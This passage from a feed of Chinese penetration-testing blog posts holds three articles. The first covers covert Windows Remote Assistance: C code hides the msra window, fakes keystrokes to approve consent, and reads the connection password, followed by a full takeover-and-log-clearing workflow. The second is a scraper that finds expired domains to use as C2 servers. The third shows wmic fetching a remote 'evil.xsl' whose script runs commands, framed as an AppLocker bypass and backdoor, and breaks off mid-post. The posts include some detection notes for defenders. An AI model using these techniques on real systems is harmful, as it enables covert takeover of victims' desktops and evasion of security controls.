title="1、隐藏msra.exe的界面"></a>1、隐藏msra.exe的界面</h3><p>获得窗口句柄，将窗口属性设置为隐藏</p><p>需要注意不同语言的系统中msra.exe的窗口标题不同，例如中文系统的窗口标题为<code>Windows 远程协助</code>，英文系统的窗口标题为<code>Windows Remote Assistance</code></p><p>可以先对当前系统语言作判断，接着寻找对应的窗口标题</p><p>为了使界面完全隐藏，需要加入循环判断，只要找到msra.exe的窗口立即对其隐藏</p><p>可供参考的代码如下：</p><pre><code>#include &lt;windows.h&gt;int main(){    char *Title = NULL;    LANGID lid = GetSystemDefaultLangID();    printf(&quot;[*]LanguageID:0x%04x\n&quot;,lid);    switch (lid)    {        case 0X0804:            printf(&quot;[*]Language:Chinese\n&quot;,lid);            Title = &quot;Windows 远程协助&quot;;            break;        case 0x0409:            printf(&quot;[*]Language:Englisth\n&quot;,lid);            Title = &quot;Windows Remote Assistance&quot;;            break;    }    for(int i=0;i&lt;1;i)    {        HWND hwnd = FindWindow(NULL, Title);        ShowWindow(hwnd, SW_HIDE);         Sleep(100);    }}</code></pre><p>编译生成<code>msra-hide.exe</code></p><h3 id="2、模拟输入键盘消息，左箭头-lt-和回车确认键"><a href="#2、模拟输入键盘消息，左箭头-lt-和回车确认键" class="headerlink" title="2、模拟输入键盘消息，左箭头(&lt;-)和回车确认键"></a>2、模拟输入键盘消息，左箭头(&lt;-)和回车确认键</h3><p>正常情况下，控制端成功输入密码后，服务端会弹框提示用户是否允许远程协助</p><p>这里通过程序实现模拟用户输入，选中<code>Yes</code>，对应的键盘操作为左箭头(&lt;-)和回车确认键</p><p>代码如下：</p><pre><code>#include &lt;windows.h&gt;int main(){    char *Title = NULL;    LANGID lid = GetSystemDefaultLangID();    printf(&quot;[*]LanguageID:0x%04x\n&quot;,lid);    switch (lid)    {        case 0X0804:            printf(&quot;[*]Language:Chinese\n&quot;,lid);            Title = &quot;Windows 远程协助&quot;;            break;        case 0x0409:            printf(&quot;[*]Language:Englisth\n&quot;,lid);            Title = &quot;Windows Remote Assistance&quot;;            break;    }    HWND hwnd = FindWindow(NULL, Title);    SetActiveWindow(hwnd);    SetForegroundWindow(hwnd);    SetFocus(hwnd);    keybd_event(37,0,0,0);    keybd_event(37,0,KEYEVENTF_KEYUP,0);    keybd_event(13,0,0,0);    keybd_event(13,0,KEYEVENTF_KEYUP,0);}</code></pre><p>编译生成<code>msra-allow.exe</code></p><h3 id="3、扩展：获得远程协助窗口的连接密码"><a href="#3、扩展：获得远程协助窗口的连接密码" class="headerlink" title="3、扩展：获得远程协助窗口的连接密码"></a>3、扩展：获得远程协助窗口的连接密码</h3><p>通过枚举子窗口获得连接密码</p><p>使用API FindWindow获得窗口句柄</p><p>使用API EnumChildWindows遍历窗口所有子窗口，获得密码内容</p><p>API EnumChildWindows会自动枚举，直至获得最后一个子窗口或者函数返回0</p><p>实际测试发现第二个子窗口保存密码，所以在获得密码后函数返回0提前结束枚举</p><p>代码如下：</p><pre><code>#include &lt;windows.h&gt;int status = 0;BOOL CALLBACK EnumMainWindow(HWND hwnd, LPARAM lParam){    const int BufferSize = 1024;    char BufferContent[BufferSize] = &quot;&quot;;    SendMessage(hwnd, WM_GETTEXT, (WPARAM)BufferSize, (LPARAM)BufferContent);    status++;    if (status == 2)    {        printf(&quot;[+]Find Password\n&quot;);              printf(&quot;%s\n&quot;, BufferContent);        return 0;    }    return 1;}int main(){    char *Title = NULL;    LANGID lid = GetSystemDefaultLangID();    printf(&quot;[*]LanguageID:0x%04x\n&quot;,lid);    switch (lid)    {        case 0X0804:            printf(&quot;[*]Language:Chinese\n&quot;,lid);            Title = &quot;Windows 远程协助&quot;;            break;       case 0x0409:            printf(&quot;[*]Language:Englisth\n&quot;,lid);            Title = &quot;Windows Remote Assistance&quot;;            break;    }         HWND hwnd = FindWindow(NULL, Title);    if(hwnd)    {        printf(&quot;[+]Find Window\n&quot;);             EnumChildWindows(hwnd, EnumMainWindow, 0);    }    else    {        printf(&quot;[!]No Window\n&quot;);      }} </code></pre><p>测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/3-1.png" alt="Alt text"></p><h2 id="0x05-完整利用流程"><a href="#0x05-完整利用流程" class="headerlink" title="0x05 完整利用流程"></a>0x05 完整利用流程</h2><hr><h3 id="1、开启远程协助"><a href="#1、开启远程协助" class="headerlink" title="1、开启远程协助"></a>1、开启远程协助</h3><pre><code>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /fnetsh advfirewall firewall set rule group=&quot;Remote Assistance&quot; new enable=Yes</code></pre><h3 id="2、运行拦截程序msra-hide-exe，隐藏msra窗口"><a href="#2、运行拦截程序msra-hide-exe，隐藏msra窗口" class="headerlink" title="2、运行拦截程序msra-hide.exe，隐藏msra窗口"></a>2、运行拦截程序msra-hide.exe，隐藏msra窗口</h3><p>需要管理员权限</p><h3 id="3、生成远程协助邀请文件"><a href="#3、生成远程协助邀请文件" class="headerlink" title="3、生成远程协助邀请文件"></a>3、生成远程协助邀请文件</h3><pre><code>msra /saveasfile c:\test\1.msrcIncident 123456789012</code></pre><h3 id="4、控制端进行连接"><a href="#4、控制端进行连接" class="headerlink" title="4、控制端进行连接"></a>4、控制端进行连接</h3><p>获得文件<code>1.msrcIncident</code>并执行，输入连接密码</p><h3 id="5、运行模拟键盘输入程序msra-allow-exe，允许远程协助"><a href="#5、运行模拟键盘输入程序msra-allow-exe，允许远程协助" class="headerlink" title="5、运行模拟键盘输入程序msra-allow.exe，允许远程协助"></a>5、运行模拟键盘输入程序msra-allow.exe，允许远程协助</h3><p>需要管理员权限</p><h3 id="6、控制端获得远程协助的桌面"><a href="#6、控制端获得远程协助的桌面" class="headerlink" title="6、控制端获得远程协助的桌面"></a>6、控制端获得远程协助的桌面</h3><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/4-1.png" alt="Alt text"></p><h3 id="7、控制端请求获得服务端的鼠标操作权限"><a href="#7、控制端请求获得服务端的鼠标操作权限" class="headerlink" title="7、控制端请求获得服务端的鼠标操作权限"></a>7、控制端请求获得服务端的鼠标操作权限</h3><p>在控制界面选择<code>请求控制</code></p><h3 id="8、再次运行模拟键盘输入程序msra-allow-exe，允许鼠标操作"><a href="#8、再次运行模拟键盘输入程序msra-allow-exe，允许鼠标操作" class="headerlink" title="8、再次运行模拟键盘输入程序msra-allow.exe，允许鼠标操作"></a>8、再次运行模拟键盘输入程序msra-allow.exe，允许鼠标操作</h3><p>需要管理员权限</p><p>控制端成功获得控制服务端鼠标</p><p>至此，成功获得目标系统的桌面操作权限</p><h3 id="9、清除连接记录"><a href="#9、清除连接记录" class="headerlink" title="9、清除连接记录"></a>9、清除连接记录</h3><p>远程协助的记录保存位置：<code>%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs</code></p><p>命名规则: <code>YYYYMMDDHHMMSS.xml</code> (24小时时间格式)</p><p>日志文件内保存连接时间</p><h2 id="0x06-检测方法"><a href="#0x06-检测方法" class="headerlink" title="0x06 检测方法"></a>0x06 检测方法</h2><hr><p>本文介绍的方法前提是已经取得了系统的管理员权限，代表该系统已经被攻破</p><p>结合利用思路，可以通过以下方法检测：</p><ul><li>注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance</code>键值被修改</li><li>防火墙规则被修改</li><li>启动进程msra.exe</li><li>生成新文件夹<code>%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs</code></li><li>开放的异常端口</li></ul><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><hr><p>本文对Windows远程协助的功能进行了介绍，编写程序实现Windows远程协助的隐蔽执行，结合利用思路给出检测方法</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透基础——选择一个合适的C2域名</title>
    <link href="wiki.cfyqy.com/posts/505d2022.html"/>
    <id>wiki.cfyqy.com/posts/505d2022.html</id>
    <published>2018-05-25T13:03:44.930Z</published>
    <updated>2018-05-25T13:04:28.165Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在渗透测试中，常常需要选择一个合适的域名作为c2服务器，那么什么样的域名才能称之为”合适”呢？</p><p>expireddomains.net也许能够给你一些思路。</p><p>通过expireddomains.net能够查询到最近过期或删除的域名，更重要的是它提供了关键词搜索功能。</p><p>本文将要测试过期域名自动化搜索工具CatMyFish，分析原理，修正其中的bug，使用python编写一个爬虫，获得所有搜索结果。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>测试过期域名自动化搜索工具CatMyFish</li><li>分析原理修正CatMyFish中的bug</li><li>爬虫开发思路和实现细节</li><li>开源python实现的爬虫代码</li></ul><h2 id="0x02-测试过期域名自动化搜索工具CatMyFish"><a href="#0x02-测试过期域名自动化搜索工具CatMyFish" class="headerlink" title="0x02 测试过期域名自动化搜索工具CatMyFish"></a>0x02 测试过期域名自动化搜索工具CatMyFish</h2><hr><p>下载地址：</p><p><a href="https://github.com/Mr-Un1k0d3r/CatMyFish" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/CatMyFish</a></p><h3 id="主要实现流程"><a href="#主要实现流程" class="headerlink" title="主要实现流程"></a>主要实现流程</h3><ul><li>用户输入关键词</li><li>脚本将搜索请求发送到expireddomains.net进行查询</li><li>获得域名列表</li><li>脚本将域名发送到Symantec BlueCoat进行查询</li><li>获取每个域名的类别</li></ul><p>expireddomains.net地址：</p><p><a href="https://www.expireddomains.net/" target="_blank" rel="noopener">https://www.expireddomains.net/</a></p><p>Symantec BlueCoat地址:</p><p><a href="https://sitereview.bluecoat.com/" target="_blank" rel="noopener">https://sitereview.bluecoat.com/</a></p><h3 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h3><p>需要安装python库beautifulsoup4</p><pre><code>pip install beautifulsoup4</code></pre><p>尝试搜索关键词microsoft，脚本报错，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-1.png" alt="Alt text"></p><p>脚本对结果的解析出现了问题</p><p>于是，按照CatMyFish的实现思路自己编写脚本测试一下</p><p>访问expireddomains.net查询关键词<code>microsoft</code>，代码如下:</p><pre><code>import urllibimport urllib2from bs4 import BeautifulSoupurl = &quot;https://www.expireddomains.net/domain-name-search/?q=microsoft&quot;req = urllib2.Request(url)res_data = urllib2.urlopen(req)html = BeautifulSoup(res_data.read(), &quot;html.parser&quot;)tds = html.findAll(&quot;td&quot;, {&quot;class&quot;: &quot;field_domain&quot;})for td in tds:    for a in td.findAll(&quot;a&quot;, {&quot;class&quot;: &quot;namelinks&quot;}):        print a.text</code></pre><p>共获得15个结果，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-2.png" alt="Alt text"></p><p>通过浏览器访问，共获得25个结果，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-3.png" alt="Alt text"></p><p>经过对比发现通过脚本获得的数目相比浏览器要少，应该是脚本在筛选的时候出现了问题</p><p><strong>注：</strong></p><p>初学者建议掌握一下beautifulsoup4的基本使用技巧，本文暂略</p><h2 id="0x03-查找bug原因"><a href="#0x03-查找bug原因" class="headerlink" title="0x03 查找bug原因"></a>0x03 查找bug原因</h2><hr><h3 id="1、根据response查看域名标签，对筛选规则进行判断"><a href="#1、根据response查看域名标签，对筛选规则进行判断" class="headerlink" title="1、根据response查看域名标签，对筛选规则进行判断"></a>1、根据response查看域名标签，对筛选规则进行判断</h3><p>需要获取到接收到的response数据，通过查看各个域名对应的标签，判断是否在标签筛选的时候出现了问题</p><p>查看response数据的两种方法：</p><h4 id="1-使用Chrome浏览器查看"><a href="#1-使用Chrome浏览器查看" class="headerlink" title="(1) 使用Chrome浏览器查看"></a>(1) 使用Chrome浏览器查看</h4><p><code>F12</code> -&gt; <code>More tools</code> -&gt; <code>Network conditions</code></p><p>重新加载网页,选择<code>?q=microsoft</code> -&gt; <code>Resonse</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-4.png" alt="Alt text"></p><h4 id="2-使用python脚本"><a href="#2-使用python脚本" class="headerlink" title="(2) 使用python脚本"></a>(2) 使用python脚本</h4><p>代码如下：</p><pre><code>import urllibimport urllib2url = &quot;https://www.expireddomains.net/domain-name-search/?q=microsoft&quot;req = urllib2.Request(url)res_data = urllib2.urlopen(req)print res_data.read()</code></pre><p>分析response数据,发现出错原因:</p><p>使用原测试脚本能够提取出如下数据中的域名:</p><pre><code>&lt;td class=&quot;field_domain&quot;&gt;&lt;a class=&quot;namelinks&quot; href=&quot;/goto/1/71h90s/59/?tr=search&quot; id=&quot;linksdd-domain71h90s&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;MicroSoft.msk.ru&quot;&gt;&lt;strong&gt;MicroSoft&lt;/strong&gt;.msk.ru&lt;/a&gt;&lt;ul class=&quot;kmenucontent&quot; id=&quot;links-domain71h90s&quot; style=&quot;display:none;&quot;&gt;&lt;li class=&quot;first&quot;&gt;&lt;a class=&quot;favicons favgodaddy&quot; href=&quot;/goto/16/75wxyx/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at GoDaddy.com&quot;&gt;GoDaddy.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favdynadot&quot; href=&quot;/goto/53/740s95/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at Dynadot.com&quot;&gt;Dynadot.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favuniregistry&quot; href=&quot;/goto/66/7252us/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at Uniregistry.com&quot;&gt;Uniregistry.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favnamecheap&quot; href=&quot;/goto/43/7459ux/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at Namecheap.com&quot;&gt;Namecheap.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons favonecom&quot; href=&quot;/goto/57/71gmkr/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at One.com&quot;&gt;One.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a class=&quot;favicons fav123reg&quot; href=&quot;/goto/48/7254ap/59/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;Register at 123-reg.co.uk&quot;&gt;123-reg.co.uk&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;</code></pre><p>但是response数据中还包含另一种类型的数据:</p><pre><code>&lt;td class=&quot;field_domain&quot;&gt;&lt;a href=&quot;/goto/1/4o47ng/39/?tr=search&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; title=&quot;NewMicroSoft.com&quot;&gt;New&lt;strong&gt;MicroSoft&lt;/strong&gt;.com&lt;/a&gt;&lt;/td&gt;</code></pre><p>原测试脚本没有提取该标签中保存的域名信息</p><h2 id="0x04-bug修复"><a href="#0x04-bug修复" class="headerlink" title="0x04 bug修复"></a>0x04 bug修复</h2><hr><p>筛选思路：</p><p>获得标签<code>&lt;td class=&quot;field_domain&quot;&gt;</code>中第一个title的内容</p><p>原因：</p><p>这样能同时获得两组数据中保存的域名信息，过滤无效信息(如第二个title中的域名GoDaddy.com)</p><p>实现代码:</p><pre><code>tds = html.findAll(&quot;td&quot;, {&quot;class&quot;: &quot;field_domain&quot;})for td in tds:    print td.findAll(&quot;a&quot;)[0][&quot;title&quot;]</code></pre><p>因此,获得完整查询结果的测试代码如下:</p><pre><code>import urllibimport urllib2import sysfrom bs4 import BeautifulSoupdef SearchExpireddomains(key):    url = &quot;https://www.expireddomains.net/domain-name-search/?q=&quot; + key     req = urllib2.Request(url)    res_data = urllib2.urlopen(req)    html = BeautifulSoup(res_data.read(), &quot;html.parser&quot;)    tds = html.findAll(&quot;td&quot;, {&quot;class&quot;: &quot;field_domain&quot;})    for td in tds:    print td.findAll(&quot;a&quot;)[0][&quot;title&quot;]if __name__ == &quot;__main__&quot;:    SearchExpireddomains(sys.argv[1])</code></pre><p>成功获得第一页的所有结果，测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/2-5.png" alt="Alt text"></p><h2 id="0x05-获得所有查询结果"><a href="#0x05-获得所有查询结果" class="headerlink" title="0x05 获得所有查询结果"></a>0x05 获得所有查询结果</h2><hr><p>expireddomains.net每页保存25个结果，想要获得所有结果，需要发送多个请求，遍历所有查询页面的结果</p><p>首先需要获得所有结果的数目，除以25获得需要查询的页面个数</p><h3 id="1、统计所有结果"><a href="#1、统计所有结果" class="headerlink" title="1、统计所有结果"></a>1、统计所有结果</h3><p>查看Response，找到表示搜索结果数目的位置，内容如下：</p><pre><code>        &lt;div class=&quot;pagescode page_top&quot;&gt;            &lt;div class=&quot;addoptions left&quot;&gt;                                    &lt;span class=&quot;showfilter&quot;&gt;Show Filter&lt;/span&gt;                    &lt;span&gt;(About &lt;strong&gt;20,213 &lt;/strong&gt; Domains)&lt;/span&gt;</code></pre><p>Chrome浏览器显示如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/3-1.png" alt="Alt text"></p><p>为了简化代码长度，使用<code>select()</code>直接传入CSS选择器进行筛选，在对标签<code>strong</code>进行筛选后，第1个标签表示结果数目，对应查询代码为：</p><pre><code>print html.select(&#39;strong&#39;)[0]</code></pre><p>输出结果为<code>&lt;strong&gt;20,213 &lt;/strong&gt;</code></p><p>提取其中的数字：</p><pre><code>print html.select(&#39;strong&#39;)[0].text</code></pre><p>输出结果为<code>20,213</code></p><p>去掉中间的”,”：</p><pre><code>print html.select(&#39;strong&#39;)[0].text.replace(&#39;,&#39;, &#39;&#39;)</code></pre><p>输出结果为<code>20213</code></p><p>除以25即可获得需要查询的页面个数，这里需要注意需要将字符串类型的”20213”转换为整型<code>20213</code></p><h3 id="2、猜测查询规律"><a href="#2、猜测查询规律" class="headerlink" title="2、猜测查询规律"></a>2、猜测查询规律</h3><p>第二页查询的url:</p><p><a href="https://www.expireddomains.net/domain-name-search/?start=25&amp;q=microsoft" target="_blank" rel="noopener">https://www.expireddomains.net/domain-name-search/?start=25&amp;q=microsoft</a></p><p>第三页查询的url:</p><p><a href="https://www.expireddomains.net/domain-name-search/?start=50&amp;q=microsoft" target="_blank" rel="noopener">https://www.expireddomains.net/domain-name-search/?start=50&amp;q=microsoft</a></p><p>找到查询规律，第i页查询的url：</p><p><a href="https://www.expireddomains.net/domain-name-search/?start=" target="_blank" rel="noopener">https://www.expireddomains.net/domain-name-search/?start=</a>&lt;25*(i-1)）&gt;&amp;q=microsoft</p><p><strong>注：</strong></p><p>经测试，expireddomains.net对未登录用户最多提供550个的结果，共21页</p><h3 id="3、对结果进行判断"><a href="#3、对结果进行判断" class="headerlink" title="3、对结果进行判断"></a>3、对结果进行判断</h3><p>在脚本实现上，需要对结果进行判断，如果结果大于550，只输出21页，如果小于550，输出&lt;结果/25&gt;页</p><h3 id="4、模拟浏览器访问-备选"><a href="#4、模拟浏览器访问-备选" class="headerlink" title="4、模拟浏览器访问(备选)"></a>4、模拟浏览器访问(备选)</h3><p>当我们使用脚本尝试自动查询多个页面时，如果网站使用了反爬虫机制，无法获得真实数据</p><p>经测试，expireddomains.net并未开启反爬虫机制</p><p>如果在将来，expireddomains.net开启了反爬虫机制，脚本需要模拟浏览器发送请求，在头部附加User-Agent等信息</p><p>查看Chrome浏览器获得发送请求的信息，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/3-2.png" alt="Alt text"></p><p>对照请求，添加头部信息即可绕过</p><p>示例代码：</p><pre><code>req.add_header(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot;)   </code></pre><p>完整代码实现地址：</p><p><a href="https://github.com/3gstudent/GetExpiredDomains" target="_blank" rel="noopener">https://github.com/3gstudent/GetExpiredDomains</a></p><p>实际测试：</p><p>搜索关键词<code>microsoftoffices</code>，结果少于550，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/4-1.png" alt="Alt text"></p><p>搜索关键词<code>microsoft</code>，结果大于550，只显示21页，如图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-29/4-2.png" alt="Alt text"></p><p>同Web访问的内容对比，结果相同，测试成功</p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文测试了过期域名自动化搜索工具CatMyFish，分析原理，修正其中的bug，使用python编写爬虫获得所有搜集结果，分享开发思路，开源代码。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用wmic调用xsl文件的分析与利用</title>
    <link href="wiki.cfyqy.com/posts/d2d3d726.html"/>
    <id>wiki.cfyqy.com/posts/d2d3d726.html</id>
    <published>2018-05-25T13:03:44.929Z</published>
    <updated>2018-05-25T13:04:28.164Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>Casey Smith@subTee在博客分享的一个技巧，使用wmic能够从本地或从URL调用XSL（可扩展样式表语言）脚本。这个发现很有用，不仅可以作为一种白名单绕过的方法，而且可以作为payload来使用(从URL调用XSL脚本，利用XSL执行exe、shellcode、powershell脚本)。</p><p>本文将要对该项技术进行测试，结合自己的经验对其扩展，分享一个后门利用的思路，介绍同XXE漏洞结合的使用方法。</p><p>博客地址：</p><p><a href="https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1" target="_blank" rel="noopener">https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>测试Casey Smith的方法</li><li>脚本分析，分析后门利用思路</li><li>编写后门利用脚本</li><li>同XXE漏洞的结合</li></ul><h2 id="0x02-测试Casey-Smith的方法"><a href="#0x02-测试Casey-Smith的方法" class="headerlink" title="0x02 测试Casey Smith的方法"></a>0x02 测试Casey Smith的方法</h2><hr><p>本地：</p><pre><code>wmic process list /FORMAT:evil.xsl</code></pre><p>远程：</p><pre><code>wmic os get /FORMAT:&quot;https://example.com/evil.xsl&quot;</code></pre><p>xsl文件内容如下：</p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;&lt;stylesheetxmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;xmlns:user=&quot;placeholder&quot;version=&quot;1.0&quot;&gt;&lt;output method=&quot;text&quot;/&gt;    &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;    &lt;![CDATA[    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);    ]]&gt; &lt;/ms:script&gt;&lt;/stylesheet&gt;</code></pre><p><strong>注：</strong></p><p>代码来源于<a href="https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl" target="_blank" rel="noopener">https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl</a></p><h2 id="0x03-脚本分析"><a href="#0x03-脚本分析" class="headerlink" title="0x03 脚本分析"></a>0x03 脚本分析</h2><hr><p>查看xsl文件格式，发现类似于之前研究过的利用脚本(使用msxsl.exe执行xsl脚本，也是学习自Casey Smith)，内容如下：</p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot;      xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;      xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;      xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;   function xml(nodelist) {    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);      return nodelist.nextNode().xml;   }&lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt;   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</code></pre><p><strong>注：</strong></p><p>代码来源于<a href="https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d" target="_blank" rel="noopener">https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</a></p><p>我对该技术的分析文章链接：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</a></p><p>经测试，文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/" target="_blank" rel="noopener">《Use msxsl to bypass AppLocker》</a>中使用的xsl脚本和xml脚本wmic均支持，只是对后缀名有要求(必须是xsl文件)</p><h3 id="实际测试："><a href="#实际测试：" class="headerlink" title="实际测试："></a>实际测试：</h3><p>执行：</p><pre><code>wmic os get /format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml&quot;</code></pre><p>执行失败，提示<code>Invalid XSL format (or) file name.</code></p><p>脚本内容不变，后缀名改为xsl，再次执行：</p><pre><code>wmic os get /format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl&quot;</code></pre><p>执行成功，成功弹出计算器，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/2-1.png" alt="Alt text"></p><h3 id="补充：-xsl和xml文件的异同"><a href="#补充：-xsl和xml文件的异同" class="headerlink" title="补充： xsl和xml文件的异同"></a>补充： xsl和xml文件的异同</h3><h4 id="相同点："><a href="#相同点：" class="headerlink" title="相同点："></a>相同点：</h4><p>语法规则基本相同，仅声明方式不同(以上测试代码未体现)</p><h4 id="不同点："><a href="#不同点：" class="headerlink" title="不同点："></a>不同点：</h4><p>用途不同，xml用于承载数据，xsl用户设置数据的格式</p><h4 id="简单理解："><a href="#简单理解：" class="headerlink" title="简单理解："></a>简单理解：</h4><p>通过使用XSL可以向XML文件添加显示信息，使用XSL显示XML</p><h2 id="0x04-后门利用思路"><a href="#0x04-后门利用思路" class="headerlink" title="0x04 后门利用思路"></a>0x04 后门利用思路</h2><hr><p>通过学习Casey Smith在博客中分享的研究思路，我想到了一个后门利用的思路</p><p>对于路径<code>c:\Windows\System32\wbem</code>下的xsl文件</p><p>例如：</p><ul><li>csv.xsl</li><li>htable.xsl</li><li>texttable.xsl</li></ul><p>同wmic命令的输出格式相对应，例如：</p><ul><li>wmic os get /format:csv</li><li>wmic os get /format:htable</li><li>wmic os get /format:texttable</li></ul><p>那么，使用wmic命令在输出格式时是否会加载对应名称的xsl文件呢？</p><p>答案是肯定的</p><p>挑选其中的csv.xsl，内容如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!-- Copyright (c) Microsoft Corporation.  All rights reserved. --&gt;&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt;&lt;xsl:output encoding=&quot;utf-16&quot; omit-xml-declaration=&quot;yes&quot;/&gt;&lt;xsl:param name=&quot;norefcomma&quot;/&gt;&lt;xsl:template match=&quot;/&quot;&gt;Node,&lt;xsl:for-each select=&quot;COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE&quot;&gt;&lt;xsl:value-of select=&quot;@NAME&quot;/&gt;&lt;xsl:if 